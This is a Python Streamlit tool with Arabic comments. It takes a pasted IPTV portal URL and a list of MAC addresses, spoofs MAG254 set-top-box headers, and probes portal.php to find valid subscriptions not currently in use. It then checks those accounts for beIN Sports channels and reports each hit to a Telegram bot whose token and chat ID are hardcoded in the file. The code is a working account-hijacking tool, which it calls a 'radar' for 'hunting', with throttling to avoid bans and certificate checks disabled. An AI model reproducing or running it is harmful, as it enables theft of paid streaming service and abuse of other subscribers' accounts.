import streamlit as st
import requests
import time
import telebot
import re
import urllib3

# إيقاف تنبيهات الأمان للسيرفرات ذات الشهادات الضعيفة
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- بياناتك الثابتة ---
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# الكلمات المفتاحية
CHANNELS_KEYS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
}

# إعداد واجهة الرادار
st.set_page_config(page_title="Radar Ayoub Hammami", page_icon="📡")
st.markdown("<h1 style='text-align: center; color: #FF4B4B;'>📡 Radar Ayoub Hammami Pro</h1>", unsafe_allow_html=True)

raw_data = st.text_area("ضع البيانات هنا (الرابط والماكات):", height=150)

def get_mag_headers(mac):
    """محاكاة كاملة لجهاز MAG254"""
    return {
        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
        'X-User-Agent': 'Model: MAG254; Link: WiFi',
        'Cookie': f'mac={mac}',
        'Accept': '*/*',
        'Referer': 'http://mag.infomir.com/',
        'Connection': 'keep-alive'
    }

if st.button("🚀 تشغيل الرادار"):
    if raw_data:
        # استخراج الماكات والروابط
        macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_data.upper())))
        host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_data)
        
        if host_match and macs:
            # تنظيف الرابط والتأكد من وجود portal.php
            base_url = host_match.group(0).split('/portal.php')[0].rstrip('/')
            api_url = f"{base_url}/portal.php"
            
            st.success(f"📡 السيرفر المستهدف: {base_url}")
            
            # عدادات النتائج
            checked_count = 0
            found_count = 0
            c1, c2 = st.columns(2)
            stat_checked = c1.metric("تم فحص", "0")
            stat_found = c2.metric("الصيد الذهبي", "0")
            
            progress = st.progress(0)
            log_box = st.empty()

            for i, current_mac in enumerate(macs):
                checked_count += 1
                headers = get_mag_headers(current_mac)
                
                try:
                    # فحص البروفايل
                    profile_url = f"{api_url}?type=stb&action=get_profile&force_stb=1"
                    r = requests.get(profile_url, headers=headers, timeout=12, verify=False)
                    
                    # التحقق من أن السيرفر رد ببيانات صحيحة
                    if r.status_code == 200 and '"active_cons"' in r.text:
                        active_match = re.search(r'"active_cons"\s*:\s*"(\d+)"', r.text)
                        is_active = active_match.group(1) if active_match else "1"

                        if is_active == "0":
                            found_count += 1
                            # فحص القنوات
                            ch_url = f"{api_url}?type=itv&action=get_all_channels"
                            r_ch = requests.get(ch_url, headers=headers, timeout=12, verify=False)
                            ch_text = r_ch.text.upper()
                            
                            found_channels = [n for n, k in CHANNELS_KEYS.items() if all(x in ch_text for x in k)]
                            
                            # إرسال التنبيه
                            msg = (f"🎯 **صيد جديد - Ayoub**\n\n"
                                   f"🖥️ الماك: `{current_mac}`\n"
                                   f"🌐 السيرفر: `{base_url}`\n"
                                   f"📺 القنوات المستهدفة: {', '.join(found_channels) if found_channels else 'غير موجودة'}\n"
                                   f"👤 المطور: Ayoub Hammami")
                            bot.send_message(ID, msg, parse_mode="Markdown")
                            st.toast(f"✅ متاح: {current_mac}")
                        else:
                            log_box.warning(f"⚠️ الماك مشغول (متصل): {current_mac}")
                    else:
                        log_box.info(f"🔎 الماك غير صالح أو منتهي: {current_mac}")
                
                except Exception:
                    log_box.error(f"❌ خطأ في الوصول للسيرفر للماك: {current_mac}")

                # تحديث الواجهة
                stat_checked.metric("تم فحص", checked_count)
                stat_found.metric("الصيد الذهبي", found_count)
                progress.progress((i + 1) / len(macs))
                time.sleep(0.8) # سرعة متوازنة لتجنب الحظر

            st.balloons()
        else:
            st.error("❌ الرابط أو الماكات غير مكتشفة في النص.")
    else:
        st.warning("⚠️ يرجى لصق البيانات أولاً.")
